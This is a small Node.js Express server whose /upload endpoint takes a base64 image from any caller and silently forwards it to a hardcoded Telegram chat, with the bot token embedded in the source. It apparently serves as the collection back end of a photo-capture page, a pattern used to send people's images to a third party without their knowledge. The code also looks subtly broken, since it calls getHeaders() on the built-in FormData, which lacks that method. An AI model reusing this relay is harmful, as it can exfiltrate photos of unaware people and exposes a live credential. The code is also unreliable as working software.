const express = require('express');
const axios = require('axios');
const fs = require('fs');

const app = express();
app.use(express.json({ limit: '10mb' }));

const TOKEN = "8732812924:AAE-Kss03U1PxK5t-73mpUm4kacQJJ7SbiY";
const CHAT_ID = "6175217169";

app.post('/upload', async (req, res) => {
  const image = req.body.image.replace(/^data:image\/png;base64,/, "");
  fs.writeFileSync("photo.png", image, 'base64');

  const formData = new FormData();
  formData.append("chat_id", CHAT_ID);
  formData.append("photo", fs.createReadStream("photo.png"));

  await axios.post(`https://api.telegram.org/bot${TOKEN}/sendPhoto`, formData, {
    headers: formData.getHeaders()
  });

  res.send("ok");
});

app.listen(3000, () => console.log("Server chạy 3000"));
